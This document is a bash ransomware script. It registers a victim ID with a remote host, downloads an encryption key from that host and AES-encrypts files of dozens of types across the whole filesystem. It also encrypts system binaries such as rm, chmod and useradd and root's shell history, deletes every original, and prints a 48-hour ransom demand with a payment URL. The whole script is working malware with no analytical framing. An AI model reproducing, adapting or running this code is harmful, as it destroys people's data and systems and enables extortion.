#!/bin/bash

genKey=$(cat /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)

curl -d "uniqueID=${genKey}" http://192.168.1.132/target.php

fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" \
          "*.key" "*.php" "*.css" "*.js" "*.tiff" "*.tff" "*.pl" \
          "*.ini" "*.xml" "*.desktop" "*.gpg" "*.enc" "*.lst" \
          "*.propertis" "*.acl" "*.gz" "*.tar" "*.bz2" "*.gif" \
          "*.doc*" "*.xls*" "*.pdf" "*.java" "*.swf" "*.jar" \
          "*.json" "*.ppt*" "*.pst" "*.bat" "*.exe" "*.x" "*.pm" \
          "*.aps*" "*.cgi" "*.htm*" "*.dll" "*.class" "*.mov" \
          "*.flv" "*.mp4" "*.mp3" "*.wav" "*.mov" "*.ogg" "*.md" \
          "*.yaml" "*.pem" "*.gpg" "*.sql" "*.vim" "*.csv" "*.bak" \
          "*.rb" "*.h" "*.c" "*.log" "*.log.*")

fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
          "/bin/rm" "/bin/netstat" "/bin/mount" "/bin/kill" \
          "/usr/sbin/useradd" "/usr/sbin/adduser" "/bin/chown" "/bin/chmod" \
          "/bin/chgrp" "/usr/sbin/userdel" "/usr/sbin/usermod" "/usr/sbin/visudo" \
          "/usr/sbin/tcpdump" "/usr/sbin/service" "/sbin/reboot" "/sbin/shutdown" \
          "/usr/sbin/mysqld" "/usr/sbin/dmidecode" "/usr/sbin/chroot" \
          "/usr/sbin/chgpassword" "/usr/sbin/apache2" "/usr/local/bin/*")

mkdir -p /tmp/.../
cd /tmp/.../

curl http://192.168.1.132:8080/pub.pem > ./pub.pem
curl http://192.168.1.132:8080/key.bin > ./key.bin

chmod 755 ./pub.pem
chmod 755 ./key.bin

for ((num=0; num<"${#fileExts[@]}"; num++))
do
  for file in $(find / -name "${fileExts[${num}]}")
  do 
    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:./key.bin 2>&1

    rm -rf ${file} 2>&1
  done
done

for ((num=0; num<"${#fileList[@]}"; num++))
do
  for file in "${fileList[${num}]}"
  do
    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:./key.bin 2>&1

    rm -rf ${file} 2>&1
  done
done

mv /tmp/.../key.bin /dev/null

echo "Your files have been encrypted using AES 256-bit encryption. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit http://192.168.1.132/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
